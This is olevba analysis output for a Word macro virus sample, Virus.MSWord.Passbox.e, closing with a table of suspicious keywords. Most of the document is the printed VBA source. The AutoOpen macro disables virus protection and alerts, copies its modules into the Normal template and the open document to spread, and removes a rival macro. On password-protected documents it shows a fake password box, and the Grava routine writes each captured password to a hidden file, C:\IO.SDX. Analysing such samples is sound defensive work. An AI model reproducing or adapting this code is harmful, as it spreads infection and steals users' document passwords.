olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Passbox.e-1107d42a18f45d942dd6c9f77a4693f9fbc011e4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Passbox.e-1107d42a18f45d942dd6c9f77a4693f9fbc011e4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angelo.bas 
in file: Virus.MSWord.Passbox.e-1107d42a18f45d942dd6c9f77a4693f9fbc011e4 - OLE stream: 'Macros/VBA/Angelo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone

   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   
   Application.EnableCancelKey = wdCancelDisabled
      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate

   DocumentInstalled = False
   GlobalInstalled = False
       
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Angelo" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Angelo" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
      
      ''''
      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   
   DocumentInstalled = False
   GlobalInstalled = False
   
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Ômega" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
         GlobalInstalled = True
      End If
   Next
   
      If GlobalInstalled = True Then
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If DocumentInstalled = True Then
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
 
Final:
    End Sub
Sub Grava()
On Error Resume Next
SetAttr "C:\IO.SDX", 0
Open "C:\IO.SDX" For Append As #1
Print #1, "Path = " + ActiveDocument.FullName
Print #1, "Password = " + PassBox.TextBox1
Print #1, " "
Close #1
SetAttr "C:\IO.SDX", 1 + 2 + 4

Unload PassBox
Application.DisplayAlerts = wdAlertsAll

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

